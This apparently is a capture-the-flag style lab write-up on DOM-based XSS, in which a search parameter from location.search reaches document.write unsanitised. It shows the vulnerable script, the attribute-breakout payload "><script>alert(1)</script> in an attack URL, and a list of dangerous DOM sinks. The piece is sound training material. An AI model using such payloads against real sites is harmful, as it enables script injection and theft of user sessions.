# DOM XSS in document.write sink using source location.search — Apprentice

**Status:** Solved

---

## Goal

Exploit DOM-based XSS where JavaScript writes user input directly into the page using `document.write`.

---

## Steps (simple & complete)

1. **Find the vulnerable page**
   - Go to the shopping app homepage
   - Use the search functionality
   - Notice the search term in the URL

2. **Analyze the page source**
   - View page source or check DevTools
   - Look for JavaScript using `document.write`
   - You'll find something like:
```javascript
   var query = new URLSearchParams(window.location.search).get('search');
   document.write('<img src="/images/tracker.gif?search=' + query + '">');
```

3. **Understand the vulnerability**
   - The app takes search parameter from URL
   - Writes it directly into HTML without sanitization
   - We can break out of the `src` attribute!

4. **Craft XSS payload**
   - Break out of img tag:
```
   "><script>alert(1)</script>
```
   - The `">` closes the img tag
   - Then our script executes

5. **Execute the attack**
```
   https://TARGET/?search="><script>alert(1)</script>
```

6. **Verify the alert**
   - Alert popup appears
   - Lab solves automatically!

---

## Example

**Normal search:**
```
URL: /?search=laptop
Generated HTML: <img src="/images/tracker.gif?search=laptop">
```

**XSS payload:**
```
URL: /?search="><script>alert(1)</script>
Generated HTML: <img src="/images/tracker.gif?search="><script>alert(1)</script>">
                                                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^
                                                       Breaks out and executes!
```

---

## Why DOM XSS is different

**Server-side XSS:**
- Server generates malicous HTML
- Sent in HTTP responce

**DOM XSS:**
- Server sends safe HTML
- Client-side JavaScript creates vulnerability
- Happens entirely in the browser
- Harder to detect with WAFs!

---

## Common DOM XSS sinks

Functions that can execute code:
- `document.write()`
- `innerHTML`
- `outerHTML`
- `eval()`
- `setTimeout()`
- `location.href`

---

